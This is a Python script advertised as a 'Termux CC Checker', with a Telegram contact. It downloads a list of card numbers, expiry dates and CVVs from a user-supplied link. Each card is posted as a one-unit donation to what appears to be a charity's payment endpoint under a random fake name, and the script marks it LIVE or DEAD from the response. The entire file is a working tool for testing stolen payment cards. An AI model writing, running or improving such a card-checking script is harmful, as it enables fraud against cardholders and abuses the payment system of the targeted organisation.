import random
import string
import asyncio
import httpx
import colorama
import sys

colorama.init(autoreset=True)

sys.stdout.write(f'''{colorama.Fore.BLUE}
░█▀▀█ ░█▀▀█ 
░█─── ░█─── 
░█▄▄█ ░█▄▄█ 

░█▀▀█ ░█─░█ ░█▀▀▀ ░█▀▀█ ░█─▄▀ ░█▀▀▀ ░█▀▀█ 
░█─── ░█▀▀█ ░█▀▀▀ ░█─── ░█▀▄─ ░█▀▀▀ ░█▄▄▀ 
░█▄▄█ ░█─░█ ░█▄▄▄ ░█▄▄█ ░█─░█ ░█▄▄▄ ░█─░█
Welcome To Termux CC Checker.
Contact me on tg @Xbinner''')


async def grab():
    CC = input('\nlink combo➾ ')
    async with httpx.AsyncClient() as client:
        cards = await client.get(CC)
        cc = cards.text.split('\n')
    return cc


async def check(CCN, MM, YY, CVV):
    letters = string.ascii_lowercase
    First = ''.join(random.choice(letters) for i in range(6))
    Last = ''.join(random.choice(letters) for i in range(6))
    Name = f'{First} {Last}'
    async with httpx.AsyncClient(http2=True) as client:
        headers = {
            "user-agent":
            "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.0.0 Mobile Safari/537.36",
            "accept": "*/*",
            "origin": "https://tdwinternationalngo.online",
            "referer":
            "https://tdwinternationalngo.online/make-payment/donate.php",
            "accept-language": "en-US,en;q=0.9",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8"
        }
        payload = {
            "cardnumber": CCN,
            "ccexp": f"{MM}/{YY[2:]}",
            "cardcvc": CVV,
            "ammount": int(1),
            "cardholdername": Name,
            "mode": "creditcardpayment"
        }
        r = await client.post(
            'https://tdwinternationalngo.online/make-payment/ajaxsub.php',
            headers=headers,
            json=payload)
        if 'Payment Failed' in r.text:
            sys.stdout.write(
                f'{colorama.Fore.RED}DEAD➾ {CCN}|{MM}|{YY}|{CVV}\nRESULT⟹ {r.text}\n'
            )
        else:
            sys.stdout.write(
                f'{colorama.Fore.GREEN}LIVE➾ {CCN}|{MM}|{YY}|{CVV}\nRESULT⟹ {r.text}\n'
            )


async def main():
    tasks = []
    CARDS = await grab()
    sys.stdout.write(f'{colorama.Fore.BLUE}TOTAL CC: {len(CARDS)}\n')
    for x in CARDS:
        CCN, MM, YY, CVV = x.split("|")
        try:
            tasks.append(await check(CCN, MM, YY, CVV))
            await asyncio.sleep(3)
            await asyncio.gather(*tasks)
        except:
            pass


asyncio.run(main())
